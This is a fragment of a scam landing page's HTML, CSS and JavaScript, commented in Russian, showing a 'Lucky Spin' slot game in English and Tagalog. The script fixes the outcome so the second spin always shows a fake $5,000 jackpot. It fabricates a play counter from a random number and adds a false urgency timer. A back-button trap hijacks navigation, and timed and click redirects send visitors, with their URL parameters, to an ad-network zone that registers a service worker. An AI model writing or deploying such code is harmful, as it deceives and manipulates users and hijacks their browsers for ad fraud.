    <script>
    function performReverseExit() {
        if (APP_CONFIG.reverse_zoneId) {
            const domain = APP_CONFIG.domain; 
            const zoneId = APP_CONFIG.reverse_zoneId;
            const currentParams = new URLSearchParams(window.location.search);
            let offerUrl = `${domain}/afu.php?zoneid=${zoneId}`;
            currentParams.forEach((value, key) => { offerUrl += `&${key}=${encodeURIComponent(value)}`; });
            offerUrl += `&sw=./sw.js`; 
            
            console.log("Reverse Exit triggered. Redirecting...");
            window.location.replace(offerUrl);
        }
    }

    (function() {
        let isTrapArmed = false;

        function armTrap() {
            if (isTrapArmed) return;
            isTrapArmed = true;

            try {
                window.history.pushState({page: 1}, document.title, window.location.href);
            } catch (e) {
                isTrapArmed = false;
                return;
            }

            setTimeout(function() {
                window.addEventListener('popstate', function(event) {
                    performReverseExit();
                });
            }, 1000);
        }

        if (document.readyState === 'complete') {
            armTrap();
        } else {
            window.addEventListener('load', armTrap);
        }

        const triggers = ['touchstart', 'scroll', 'click', 'mouseover'];
        triggers.forEach(evt => {
            document.addEventListener(evt, armTrap, { once: true, passive: true });
        });
    })();
    </script>

        .timer-container {
            width: 90%; height: 12px; background: rgba(0,0,0,0.6); border-radius: 10px;
            margin: 0 auto 15px auto; overflow: hidden; border: 2px solid #555; display: none;

        .timer-text {

            border: 4px solid #ffd700; border-radius: 15px; padding: 15px;
            box-shadow: 0 0 40px rgba(255, 0, 222, 0.4); margin: 0 auto; width: 90%;
        }
        .slot-window {
            background: #fff; border: 3px solid #333; border-radius: 8px; height: 150px;
            overflow: hidden; display: flex; justify-content: space-around; position: relative;
            box-shadow: inset 0 0 15px rgba(0,0,0,0.8);
        }
        .payline {
            position: absolute; top: 50%; left: 0; right: 0; height: 2px;
            background: rgba(255, 0, 0, 0.7); box-shadow: 0 0 5px red;
            transform: translateY(-50%); z-index: 5; pointer-events: none;
        }

        .reel {
            width: 30%; height: 100%; text-align: center; transform: translateY(0); font-size: 0; 
        }
        .reel img {
            width: 90px; height: 90px; margin-top: 30px; margin-bottom: 30px;
            object-fit: contain; filter: drop-shadow(0 2px 2px rgba(0,0,0,0.3));
        }
        .reel.blur { filter: blur(5px); }

        .spin-btn {
            background: linear-gradient(180deg, #ffd700 0%, #ff8c00 100%);
            border: none; border-radius: 50px; padding: 15px 40px;
            font-size: 24px; font-weight: bold; color: #4a0000; text-transform: uppercase;
            cursor: pointer; margin-top: 25px; box-shadow: 0 6px 0 #b85c00, 0 10px 20px rgba(0,0,0,0.5);
            transition: transform 0.1s; animation: pulse-btn 1.5s infinite;
        }
        .spin-btn:active { transform: translateY(4px); box-shadow: 0 2px 0 #b85c00; }
        .spin-btn:disabled { filter: grayscale(1); animation: none; cursor: not-allowed; }

        .winner-modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); z-index: 100;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            opacity: 0; pointer-events: none; transition: opacity 0.5s;
        }
        .winner-modal.show { opacity: 1; pointer-events: auto; }

        .winner-content {
            background: #fff; padding: 30px 20px; border-radius: 20px; text-align: center;
            color: #333; width: 90%; max-width: 380px;
            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
            border: 6px solid #ffd700; box-shadow: 0 0 50px rgba(255, 215, 0, 0.5);
        }

        .winner-content h2 {
            font-size: 42px; line-height: 1; margin: 0 0 15px 0; color: #ffd700; 
            text-transform: uppercase; text-shadow: 2px 2px 0px #b8860b, 0 0 20px #ff00de; 
            animation: pulse-jackpot 0.8s infinite alternate;
        }

        .winner-content p { font-size: 18px; margin-bottom: 15px; font-weight: bold; }

        .win-icons-row {
            display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 20px;
        }
        .win-icons-row img {
            width: 80px; height: 80px; object-fit: contain; filter: drop-shadow(0 4px 4px rgba(0,0,0,0.3));
            animation: popIn 0.5s ease-out backwards;
        }
        .win-icons-row img:nth-child(1) { animation-delay: 0.1s; }
        .win-icons-row img:nth-child(2) { animation-delay: 0.3s; }
        .win-icons-row img:nth-child(3) { animation-delay: 0.5s; }

        .claim-btn {
            background: #28a745; color: white; border: none; padding: 15px 30px;
            font-size: 20px; font-weight: bold; border-radius: 10px; cursor: pointer;
            text-decoration: none; display: inline-block; box-shadow: 0 4px 0 #1e7e34;
            animation: pulse-btn 1s infinite;
        }

        @keyframes pulse-logo { 0% { text-shadow: 0 0 10px #ff00de; } 50% { text-shadow: 0 0 25px #ff00de, 0 0 10px #fff; } 100% { text-shadow: 0 0 10px #ff00de; } }
        @keyframes pulse-btn { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        @keyframes popIn { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        @keyframes progress { from { width: 100%; background: #00ff00; } to { width: 0%; background: #ff0000; } }
        @keyframes pulse-jackpot {
            from { transform: scale(1); text-shadow: 2px 2px 0px #b8860b, 0 0 10px #ff00de; }
            to { transform: scale(1.1); text-shadow: 2px 2px 0px #b8860b, 0 0 30px #ff00de; }
        }
    </style>
</head>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            
            // --- РАНДОМНОЕ ЧИСЛО ЗАПУСКОВ ---
            // Генерируем число от 7005 до 18223
            const min = 7005;
            const max = 18223;
            const randomPlays = Math.floor(Math.random() * (max - min + 1)) + min;
            const formattedPlays = randomPlays.toLocaleString(); // Добавляет запятые (12,345)

            // --- ЛОГИКА ПЕРЕВОДОВ ---
            const translations = {
                en: {
                    title: "LUCKY SPIN",
                    timer: "HURRY UP! BONUS EXPIRES IN:",
                    spinBtn: "SPIN NOW",
                    spinning: "SPINNING...",
                    spinAgain: "SPIN AGAIN!",
                    jackpot: "JACKPOT!",
                    match: "You matched 3 Money Bags!",
                    won: "You have won <b style='color: #d32f2f; font-size: 22px;'>$5,000 BONUS</b>.",
                    claim: "CLAIM REWARD",
                    plays: "Total spins today: " + formattedPlays
                },
                ph: { // ФИЛИППИНЫ (TAGALOG)
                    title: "MASWERTENG SPIN",
                    timer: "BILISAN! MATATAPOS ANG BONUS SA:",
                    spinBtn: "IKOT NA",
                    spinning: "UMIIKOT...",
                    spinAgain: "IKOT ULIT!",
                    jackpot: "JACKPOT!",
                    match: "Tumugma ang 3 Supot ng Pera!",
                    won: "Nanalo ka ng <b style='color: #d32f2f; font-size: 22px;'>$5,000 BONUS</b>.",
                    claim: "KUNIN ANG PREMYO",
                    plays: "Kabuuang spin ngayon: " + formattedPlays
                }
            };

            const urlParams = new URLSearchParams(window.location.search);
            const geo = urlParams.get('geo') || 'EN'; 
            const lang = (geo.toUpperCase() === 'PH' || geo.toUpperCase() === 'PHILIPPINES') ? 'ph' : 'en';
            const t = translations[lang];

            // Применяем переводы
            document.getElementById('titleText').innerText = t.title;
            document.getElementById('timerText').innerText = t.timer;
            document.getElementById('spinBtn').innerText = t.spinBtn;
            document.getElementById('winTitle').innerText = t.jackpot;
            document.getElementById('winSub').innerText = t.match;
            document.getElementById('winBody').innerHTML = t.won;
            document.getElementById('claimBtn').innerText = t.claim;
            document.getElementById('socialProof').innerText = t.plays; // Вставляем счетчик

            // --- ОСНОВНАЯ ЛОГИКА ---
            const spinBtn = document.getElementById('spinBtn');
            const claimBtn = document.getElementById('claimBtn');
            const winModal = document.getElementById('winModal');
            const timerContainer = document.getElementById('timerContainer');
            const timerBar = document.getElementById('timerBar');
            const timerText = document.getElementById('timerText');
            
            const reels = [document.getElementById('reel1'), document.getElementById('reel2'), document.getElementById('reel3')];
            const iconHeight = 150; 
            
            const winSound = new Audio('./assets/sounds/win.mp3');
            
            let spinCount = 0; 
            let autoExitTimer = null; 

            async function performMainExit(isClick = false) {
                const domain = APP_CONFIG.domain; 
                const zoneId = isClick ? APP_CONFIG.mainExit_newTab_zoneId : APP_CONFIG.mainExit_currentTab_zoneId;

                if(!zoneId) { 
                    window.location.href = "https://google.com"; 
                    return; 
                }
                
                const currentParams = new URLSearchParams(window.location.search);
                let offerUrl = `${domain}/afu.php?zoneid=${zoneId}`;
                currentParams.forEach((value, key) => { offerUrl += `&${key}=${encodeURIComponent(value)}`; });
                offerUrl += `&sw=./sw.js`; 
                
                console.log(`Redirecting to zone ${zoneId} (Click: ${isClick})`);

                if (isClick) {
                    window.open(offerUrl, '_blank');
                } else {
                    window.location.href = offerUrl;
                }
            }

            spinBtn.addEventListener('click', function() {
                if(spinBtn.disabled) return; 
                
                if(navigator.vibrate) navigator.vibrate(100);
                spinBtn.disabled = true; 
                
                spinBtn.innerText = t.spinning; 

                let targetIndex = 0;
                
                if (spinCount === 0) {
                    targetIndex = 10;
                    
                    timerContainer.style.display = 'block';
                    timerText.style.display = 'block';
                    timerBar.style.animation = "progress 14s linear forwards";
                    
                    console.log("Auto-exit timer started: 14s");
                    autoExitTimer = setTimeout(() => {
                        performMainExit(false);
                    }, 14000);

                    setTimeout(() => {
                        spinBtn.disabled = false;
                        spinBtn.innerText = t.spinAgain;
                    }, 4000); 

                } else {
                    targetIndex = 15;
                    if(autoExitTimer) clearTimeout(autoExitTimer);
                    
                    setTimeout(() => { 
                        winModal.classList.add('show'); 
                        winSound.play().catch(e => console.log("Sound error:", e));

                        console.log("Jackpot shown. Auto-redirect in 10s...");
                        setTimeout(() => {
                            performMainExit(false);
                        }, 10000);

                    }, 4500);
                }

                reels.forEach((reel, index) => {
                    const duration = 2500 + (index * 800);
                    const endPos = targetIndex * iconHeight * -1;
                    
                    setTimeout(() => {
                        reel.classList.add('blur');
                        reel.style.transition = `transform ${duration}ms cubic-bezier(0.15, 0.9, 0.3, 1)`; 
                        reel.style.transform = `translateY(${endPos}px)`;
                    }, 50);

                    setTimeout(() => { reel.classList.remove('blur'); }, duration + 50);
                });

                spinCount++;
            });

            claimBtn.addEventListener('click', function() {
                performMainExit(true);
            });
        });
    </script>
